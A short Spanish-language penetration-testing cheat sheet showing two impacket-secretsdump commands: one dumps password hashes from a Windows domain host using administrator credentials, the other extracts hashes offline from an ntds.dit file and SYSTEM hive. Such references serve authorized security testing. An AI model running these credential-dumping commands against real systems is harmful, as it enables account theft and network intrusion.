# SecretsDump Cheat Sheet

#### Dump Hashes - cuando tienes un usuario que pertenece al grupo Administrador
```
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP-TARGET>
```

#### Extraer Hashes de archivos ntds.dit
```
impacket-secretsdump.py -ntds <FILE.dit> -system <FILE-SYSTEM> LOCAL
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)